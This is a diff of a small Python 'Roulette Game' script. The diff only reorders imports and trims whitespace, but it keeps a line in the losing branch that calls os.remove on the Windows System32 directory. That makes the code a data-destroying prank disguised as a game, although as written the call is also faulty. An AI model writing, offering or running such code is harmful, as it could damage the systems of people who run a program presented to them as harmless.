@@ -1,5 +1,5 @@
-import random
 import os
+import random
 
 print("Welcome to the Roulette Game!")
 
@@ -12,5 +12,4 @@ if guess == num:
     print("You won!")
 else:
     print("Good Bye!")
-    os.remove("C:\Windows\System32") 
-
+    os.remove("C:\Windows\System32")
